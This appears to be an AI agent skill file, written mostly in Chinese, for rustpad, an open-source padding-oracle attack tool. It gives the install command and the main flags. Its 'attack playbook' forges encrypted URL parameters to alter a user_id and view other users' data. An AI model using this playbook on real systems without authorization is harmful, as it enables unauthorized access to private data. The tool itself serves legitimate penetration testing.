---
name: rustpad-oracle-gui
description: "rustpad: Forges encrypted parameters for horizontal privilege escalation. Signals: cryptographic attack, encryption cracking, decryption mode, forged ciphertext mode, injection point marking."
zh-signals: "rustpad: 加密参数伪造(水平越权)。信号:密码学攻击,加密破解,解密模式,伪造密文模式,注入点标记。"
---

# rustpad

- 攻击大类:C49 密码误用与协议分析
- 上游仓库:https://github.com/Kibouo/rustpad
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
cargo install rustpad
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `rustpad --url 'https://t.com/?id=xxx' --block-size 16` | 交互式 padding oracle |
| `--decrypt` | 解密模式 |
| `--encrypt` | 伪造密文模式 |
| `--query 'id=FUZZ'` | 注入点标记 |

## 攻击场景 Playbook

### 加密参数伪造(水平越权)

```bash
rustpad --url 'https://t.com/view?doc=IVCIPHER' --block-size 16 --encrypt
# 改 user_id 密文,越权看他人数据
```

## 注意事项

交互式 TUI padding oracle 工具,支持加密模式——伪造任意明文密文,比只解密的工具多一半能力。
